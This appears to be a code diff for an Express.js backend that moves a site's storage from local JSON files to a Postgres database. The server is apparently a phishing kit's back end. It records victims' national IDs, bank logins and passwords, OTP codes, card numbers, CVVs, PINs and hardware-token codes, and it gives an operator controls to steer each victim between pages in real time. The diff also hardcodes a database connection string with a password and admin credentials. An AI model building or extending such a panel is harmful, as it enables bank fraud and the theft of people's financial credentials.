@@ -1,22 +1,23 @@
 const express = require('express');
 const path = require('path');
-const fs = require('fs');
 const crypto = require('crypto');
 const cookieParser = require('cookie-parser');
+const { Pool } = require('pg');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const IS_VERCEL = !!process.env.VERCEL;
 
 app.use(express.json({ limit: '10mb' }));
 app.use(cookieParser());
 
-const IS_VERCEL = !!process.env.VERCEL;
-const DATA_DIR = IS_VERCEL ? '/tmp' : path.join(__dirname, 'data');
-try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) { }
+const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://postgres:R!Yv2Z%23%24nbhxC8!@db.sgcswfefivycflenyoaf.supabase.co:5432/postgres';
 
-const DATA_FILE = path.join(DATA_DIR, 'visitors.json');
-const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');
-const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');
+const pool = new Pool({
+  connectionString: DATABASE_URL,
+  ssl: { rejectUnauthorized: false },
+  max: 3,
+});
 
 const ADMIN_USERNAME = 'Admin';
 const ADMIN_PASSWORD = 'JAFAR';
@@ -25,45 +26,76 @@ let applications = [];
 let liveVisitors = [];
 let totalVisitors = 0;
 let adminConfig = { whatsAppLink: '', customMessage: '' };
+let dataLoaded = false;
 
-try {
-  if (fs.existsSync(DATA_FILE)) {
-    const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-    applications = data.applications || [];
-    liveVisitors = data.liveVisitors || [];
-    totalVisitors = data.totalVisitors || 0;
-  }
-} catch (e) { }
-
-try {
-  if (fs.existsSync(ADMIN_FILE)) adminConfig = JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8'));
-} catch (e) { }
-
-function saveDataSync() {
+async function initDB() {
   try {
-    fs.writeFileSync(DATA_FILE, JSON.stringify({
-      applications, liveVisitors, totalVisitors
-    }, null, 2), 'utf8');
-  } catch (e) { console.error('Save failed:', e.message); }
-}
-
-let saveTimer = null;
-function saveData() {
-  if (IS_VERCEL) {
-    saveDataSync();
-    return;
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS app_data (
+        key TEXT PRIMARY KEY,
+        value JSONB NOT NULL DEFAULT '[]'::jsonb,
+        updated_at TIMESTAMPTZ DEFAULT NOW()
+      )
+    `);
+  } catch (e) {
+    console.error('initDB failed:', e.message);
   }
-  if (saveTimer) return;
-  saveTimer = setTimeout(() => {
-    saveTimer = null;
-    saveDataSync();
-  }, 500);
 }
 
-function saveAdmin() {
-  try { fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminConfig, null, 2), 'utf8'); }
-  catch (e) { }
+async function loadData() {
+  try {
+    const res = await pool.query('SELECT key, value FROM app_data');
+    for (const row of res.rows) {
+      switch (row.key) {
+        case 'applications': applications = row.value || []; break;
+        case 'visitors': liveVisitors = row.value || []; break;
+        case 'total_visitors': totalVisitors = (typeof row.value === 'number') ? row.value : (row.value?.count || 0); break;
+        case 'admin_config': adminConfig = row.value || { whatsAppLink: '', customMessage: '' }; break;
+      }
+    }
+    dataLoaded = true;
+  } catch (e) {
+    console.error('loadData failed:', e.message);
+  }
 }
+
+async function saveData() {
+  try {
+    await pool.query(`
+      INSERT INTO app_data (key, value, updated_at) VALUES
+        ('applications', $1::jsonb, NOW()),
+        ('visitors', $2::jsonb, NOW()),
+        ('total_visitors', $3::jsonb, NOW())
+      ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = NOW()
+    `, [
+      JSON.stringify(applications),
+      JSON.stringify(liveVisitors),
+      JSON.stringify(totalVisitors)
+    ]);
+  } catch (e) {
+    console.error('saveData failed:', e.message);
+  }
+}
+
+async function saveAdmin() {
+  try {
+    await pool.query(`
+      INSERT INTO app_data (key, value, updated_at) VALUES ('admin_config', $1::jsonb, NOW())
+      ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = NOW()
+    `, [JSON.stringify(adminConfig)]);
+  } catch (e) {
+    console.error('saveAdmin failed:', e.message);
+  }
+}
+
+// Load data from DB before handling requests
+app.use(async (req, res, next) => {
+  if (!dataLoaded) {
+    await initDB();
+    await loadData();
+  }
+  next();
+});
 
 const adminSessions = {};
 const SESSION_COOKIE = 'manus-session';
@@ -90,18 +122,13 @@ function findApp(nationalId) {
   return applications.find(a => a.nationalId === nationalId);
 }
 
-function findAppById(id) {
-  return applications.find(a => a.id === id);
-}
-
 function unwrapInput(raw) {
   if (!raw) return {};
   if (raw.json !== undefined) return raw.json;
   return raw;
 }
 
-// tRPC handler - supports both admin.X and X formats
-function handleProcedure(fullPath, rawInput, req, res) {
+async function handleProcedure(fullPath, rawInput, req, res) {
   const procedure = fullPath.replace(/^(admin|applications)\./, '');
   const input = unwrapInput(rawInput);
 
@@ -131,28 +158,25 @@ function handleProcedure(fullPath, rawInput, req, res) {
     }
 
     case 'getApplications': {
+      await loadData();
       const activeIds = getActiveIds();
-      return {
-        apps: applications,
-        activeIds,
-        totalVisitors
-      };
+      return { apps: applications, activeIds, totalVisitors };
     }
 
     case 'getLiveVisitors': {
+      await loadData();
       const cutoff = Date.now() - 15000;
       const live = liveVisitors.filter(v => v.lastActiveAt && v.lastActiveAt > cutoff);
       return { visitors: live };
     }
 
     case 'getAllVisitors': {
-      return {
-        visitors: liveVisitors,
-        totalCount: totalVisitors
-      };
+      await loadData();
+      return { visitors: liveVisitors, totalCount: totalVisitors };
     }
 
     case 'savePersonalInfo': {
+      await loadData();
       const { nationalId, phoneNumber, fullName, governorate, address } = input;
       if (!nationalId) return { success: false };
       let app = findApp(nationalId);
@@ -161,108 +185,121 @@ function handleProcedure(fullPath, rawInput, req, res) {
         applications.push(app);
       }
       Object.assign(app, { phoneNumber, fullName, governorate, address, currentPage: 'personal', lastActiveAt: Date.now() });
-      saveData();
+      await saveData();
       return { success: true };
     }
 
     case 'saveLoginData': {
+      await loadData();
       const { nationalId, username, password } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { username, password, currentPage: 'login', lastActiveAt: Date.now() });
-        saveData();
+        await saveData();
       }
       return { success: true };
     }
 
     case 'saveOtpData': {
+      await loadData();
       const { nationalId, otpCode } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { otpCode, currentPage: 'otp', lastActiveAt: Date.now() });
-        saveData();
+        await saveData();
       }
       return { success: true };
     }
 
     case 'saveCardData': {
+      await loadData();
       const { nationalId, cardNumber, cardExpiry, cardCvv, cardPin } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { cardNumber, cardExpiry, cardCvv, cardPin, currentPage: 'card', lastActiveAt: Date.now() });
-        saveData();
+        await saveData();
       }
       return { success: true };
     }
 
     case 'saveWatchLink': {
+      await loadData();
       const { nationalId, watchLinkOtp } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { watchLinkOtp, currentPage: 'watchlink', lastActiveAt: Date.now() });
-        saveData();
+        await saveData();
       }
       return { success: true };
     }
 
     case 'saveHardToken': {
+      await loadData();
       const { nationalId, hardTokenCode } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { hardTokenCode, currentPage: 'hard-token', lastActiveAt: Date.now() });
-        saveData();
+        await saveData();
       }
       return { success: true };
     }
 
     case 'updatePage': {
+      await loadData();
       const { nationalId, page } = input;
       const app = findApp(nationalId);
       if (app) {
         app.currentPage = page;
         app.lastActiveAt = Date.now();
-        saveData();
+        await saveData();
       }
       return { success: true };
     }
 
     case 'redirectUser':
     case 'redirectVisitor': {
+      await loadData();
       const { nationalId, sessionId, page, showError } = input;
       if (nationalId) {
         const app = findApp(nationalId);
-        if (app) { app.redirectTo = page; app.redirectError = showError || false; saveData(); }
+        if (app) { app.redirectTo = page; app.redirectError = showError || false; }
       }
       if (sessionId) {
         const v = liveVisitors.find(x => x.sessionId === sessionId);
-        if (v) { v.redirectTo = page; saveData(); }
+        if (v) { v.redirectTo = page; }
       }
+      await saveData();
       return { success: true };
     }
 
     case 'clearVisitorRedirect': {
+      await loadData();
       const { nationalId, sessionId } = input;
       if (nationalId) {
         const app = findApp(nationalId);
-        if (app) { delete app.redirectTo; delete app.redirectError; saveData(); }
+        if (app) { delete app.redirectTo; delete app.redirectError; }
       }
       if (sessionId) {
         const v = liveVisitors.find(x => x.sessionId === sessionId);
-        if (v) { delete v.redirectTo; saveData(); }
+        if (v) { delete v.redirectTo; }
       }
+      await saveData();
       return { success: true };
     }
 
     case 'clearRedirectByUser': {
+      await loadData();
       const { nationalId } = input;
       if (nationalId) {
         const app = findApp(nationalId);
-        if (app) { delete app.redirectTo; delete app.redirectError; saveData(); }
+        if (app) { delete app.redirectTo; delete app.redirectError; }
       }
+      await saveData();
       return { success: true };
     }
 
     case 'getRedirectStatus': {
+      await loadData();
       const { nationalId } = input;
       if (nationalId) {
         const app = findApp(nationalId);
@@ -272,6 +309,7 @@ function handleProcedure(fullPath, rawInput, req, res) {
     }
 
     case 'getVisitorRedirect': {
+      await loadData();
       const { sessionId } = input;
       if (sessionId) {
         const v = liveVisitors.find(x => x.sessionId === sessionId);
@@ -281,90 +319,103 @@ function handleProcedure(fullPath, rawInput, req, res) {
     }
 
     case 'redirectAllToToken': {
+      await loadData();
       applications.forEach(a => { a.redirectTo = 'token'; });
-      saveData();
+      await saveData();
       return { success: true };
     }
 
     case 'redirectWhatsApp': {
+      await loadData();
       const { nationalId } = input;
       const app = findApp(nationalId);
-      if (app) { app.redirectTo = 'whatsapp'; saveData(); }
+      if (app) { app.redirectTo = 'whatsapp'; }
+      await saveData();
       return { success: true };
     }
 
     case 'approveLogin': {
+      await loadData();
       const { nationalId } = input;
       const app = findApp(nationalId);
-      if (app) { app.loginStatus = 'approved'; saveData(); }
+      if (app) { app.loginStatus = 'approved'; }
+      await saveData();
       return { success: true };
     }
 
     case 'rejectLogin': {
+      await loadData();
       const { nationalId } = input;
       const app = findApp(nationalId);
-      if (app) { app.loginStatus = 'rejected'; saveData(); }
+      if (app) { app.loginStatus = 'rejected'; }
+      await saveData();
       return { success: true };
     }
 
     case 'deleteApplication': {
+      await loadData();
       const { nationalId } = input;
       applications = applications.filter(a => a.nationalId !== nationalId);
-      saveData();
+      await saveData();
       return { success: true };
     }
 
     case 'deleteInactiveClients': {
+      await loadData();
       const activeIds = getActiveIds();
       const before = applications.length;
       applications = applications.filter(a => activeIds.includes(a.nationalId));
-      saveData();
+      await saveData();
       return { success: true, deletedCount: before - applications.length };
     }
 
     case 'resetTotalVisitors': {
       totalVisitors = 0;
       liveVisitors = [];
-      saveData();
+      await saveData();
       return { success: true };
     }
 
     case 'getWhatsAppLink': {
+      await loadData();
       return { link: adminConfig.whatsAppLink || '' };
     }
 
     case 'updateWhatsAppLink': {
       adminConfig.whatsAppLink = input.link || '';
-      saveAdmin();
+      await saveAdmin();
       return { success: true };
     }
 
     case 'getCustomMessage': {
+      await loadData();
       return { message: adminConfig.customMessage || '' };
     }
 
     case 'setCustomMessage': {
+      await loadData();
       const { nationalId, message } = input;
       if (nationalId) {
         const app = findApp(nationalId);
-        if (app) { app.customMessage = message; saveData(); }
+        if (app) { app.customMessage = message; await saveData(); }
       } else {
         adminConfig.customMessage = message || '';
-        saveAdmin();
+        await saveAdmin();
       }
       return { success: true };
     }
 
     case 'clearCustomMessage': {
       adminConfig.customMessage = '';
-      saveAdmin();
+      await saveAdmin();
       return { success: true };
     }
 
     case 'updateVisitor': {
+      await loadData();
       const { nationalId, ...data } = input;
       const app = findApp(nationalId);
-      if (app) { Object.assign(app, data); saveData(); }
+      if (app) { Object.assign(app, data); await saveData(); }
       return { success: true };
     }
 
@@ -373,8 +424,7 @@ function handleProcedure(fullPath, rawInput, req, res) {
   }
 }
 
-// All tRPC requests go through batch handler (httpBatchLink always batches)
-app.all('/api/trpc/*', (req, res) => {
+app.all('/api/trpc/*', async (req, res) => {
   const fullPath = req.params[0] || '';
   const procedures = fullPath.split(',').filter(Boolean);
   const results = [];
@@ -396,7 +446,7 @@ app.all('/api/trpc/*', (req, res) => {
     }
 
     try {
-      const result = handleProcedure(proc, rawInput, req, res);
+      const result = await handleProcedure(proc, rawInput, req, res);
       results.push({ result: { data: { json: result } } });
     } catch (err) {
       const httpStatus = err.httpStatus || 500;
@@ -409,10 +459,11 @@ app.all('/api/trpc/*', (req, res) => {
   res.json(results);
 });
 
-// Visitor presence tracking
-app.post('/api/presence', (req, res) => {
+app.post('/api/presence', async (req, res) => {
   const { sessionId, currentPage } = req.body || {};
   if (!sessionId) return res.json({ ok: false });
+
+  await loadData();
 
   let visitor = liveVisitors.find(v => v.sessionId === sessionId);
   if (!visitor) {
@@ -422,46 +473,46 @@ app.post('/api/presence', (req, res) => {
   }
   visitor.lastActiveAt = Date.now();
   if (currentPage) visitor.currentPage = currentPage;
-  saveData();
 
   const redirectTo = visitor.redirectTo;
   if (redirectTo) {
     delete visitor.redirectTo;
-    saveData();
+    await saveData();
     return res.json({ ok: true, redirectTo });
   }
+  await saveData();
   res.json({ ok: true });
 });
 
-app.post('/api/heartbeat', (req, res) => {
+app.post('/api/heartbeat', async (req, res) => {
   const { sessionId, visitorId } = req.body || {};
   const id = sessionId || visitorId;
   if (id) {
+    await loadData();
     const visitor = liveVisitors.find(v => v.sessionId === id);
     if (visitor) {
       visitor.lastActiveAt = Date.now();
-      saveData();
+      await saveData();
     }
   }
   res.json({ ok: true });
 });
 
-// OAuth callback stub
 app.get('/api/oauth/callback', (req, res) => {
   res.redirect('/admin/dashboard');
 });
 
-// Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
 
-// SPA fallback
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 if (!IS_VERCEL) {
-  app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+  initDB().then(() => loadData()).then(() => {
+    app.listen(PORT, () => {
+      console.log(`Server running on http://localhost:${PORT}`);
+    });
   });
 }
 
